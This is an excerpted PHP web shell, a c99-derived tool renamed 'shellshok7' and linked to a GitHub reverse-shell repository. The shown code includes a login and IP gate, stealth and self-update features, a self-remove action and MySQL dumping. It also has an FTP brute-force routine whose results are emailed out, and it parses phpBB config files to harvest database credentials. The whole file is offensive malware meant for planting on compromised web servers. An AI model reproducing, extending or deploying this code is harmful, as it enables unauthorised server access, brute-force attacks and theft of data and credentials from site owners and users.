<?php 
//nu11secur1ty - development and debugging-2023
...
$shver = "2.0 [PHP 7 Update] [03.06.2023]";
if (!empty($unset_surl))
{
...
$accessdeniedmess = "<a href=\"https://github.com/nu11secur1ty/PHP/tree/master/reverse-shell\">shellshok7 v." . $shver . "</a>: access denied";
$gzipencode = true;
$updatenow = false;
$c99sh_updateurl = "https://github.com/nu11secur1ty/PHP/tree/master/reverse-shell";
$c99sh_sourcesurl = "https://github.com/nu11secur1ty/PHP/tree/master/reverse-shell";
$filestealth = true;
...
{
    exit("<a href=\"https://github.com/nu11secur1ty/PHP/tree/master/reverse-shell\">shellshok7</a>: Access Denied - your host (" . getenv("REMOTE_ADDR") . ") not allow");
}
if (!empty($login))
{
    if (empty($md5_pass))
    ...
    if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
    {
        ...
        header("WWW-Authenticate: Basic realm=\"shellshok7 " . $shver . ": " . $login_txt . "\"");
...
if ($act != "img")
{
                ...
                if ($data{0} == "\x99" and $data{1} == "\x03")
                {
                    ...
                    if ($update)
                    {
                        ...
                        else
                        {
                            ...
                            if (!$fp)
                            {
                                return "Local error: can't write update to " . __FILE__ . "! You may download shellshok7.php manually <a href=\"" . $sourceurl . "\"><u>here</u></a>.";
                            }
                            else
                            {
                                fwrite($fp, $source);
    ...
    if (!function_exists("mysql_dump"))
    {
        function mysql_dump($set)
        {
            ...
            $out = "# Dumped by shellshok7.SQL v. " . $shver . "
					# Home page: https://github.com/nu11secur1ty/PHP/tree/master/reverse-shell
					#
					# Host settings:
            ...
            if (!empty($submit))
            {
                ...
                else
                {
                    if ($fqb_logging)
                    {
                        ...
                        $fqb_log = "FTP Quick Brute (called shellshok7 v. " . $shver . ") started at " . date("d.m.Y H:i:s") . "\r\n\r\n";
                        if ($fqb_logfile)
                        {
                    ...
                    if ($fqb_logemail)
                    {
                        @mail($fqb_logemail, "shellshok7 v. " . $shver . " report", $fqb_log);
                    }
                    fclose($fqb_logfp);
                }
            }
 ...
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"" . base64_encode($encoder_input) . "\" readonly></center>";
    ...
    if ($act == "selfremove")
    {
        if (($submit == $rndcode) and ($submit != ""))
        {
            ...
            {
                @ob_clean();
                echo "Thanks for using shellshok7 v." . $shver . "!";
                c99shexit();
            }
            else
            {
    ...
    if ($act == "feedback")
    {
        ...
        if (!empty($submit))
        {
            ...
            $body = "shellshok7 v." . $shver . " feedback #" . $ticket . "\nName: " . htmlspecialchars($fdbk_name) . "\nE-mail: " . htmlspecialchars($fdbk_email) . "\nMessage:\n" . htmlspecialchars($fdbk_body) . "\n\nIP: " . $REMOTE_ADDR;
            if (!empty($fdbk_ref))
            {
                $tmp = @ob_get_contents();
                ob_clean();
            ...
            mail($suppmail, "shellshok7 v." . $shver . " feedback #" . $ticket, $body, "FROM: " . $suppmail);
            ...
            elseif ($ft == "code")
            {
                if (preg_match("php" . "BB 2.(.*) auto-generated config file", $r))
                {
                    ...
                    if (count($arr == 18))
                    {
                        ...
                        {
                            echo "But, you can't connect to forum sql-base, because db-software=\"" . $dbms . "\" is not supported by shellshok7. Please, report us for fix.";
                        }
...
if ($act == "about")
{
    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of shellshok7.<br><br>and <u>nu11secur1ty</u> for Latest safe-build and update for PHP 7.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in https://github.com/nu11secur1ty/PHP/tree/master/reverse-shell </b>";
} ?>
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ shellshok7 v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> nu11secur1ty | <a href="https://github.com/nu11secur1ty/PHP/tree/master/reverse-shell"><font color="#FF0000">shellshok7 Github</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
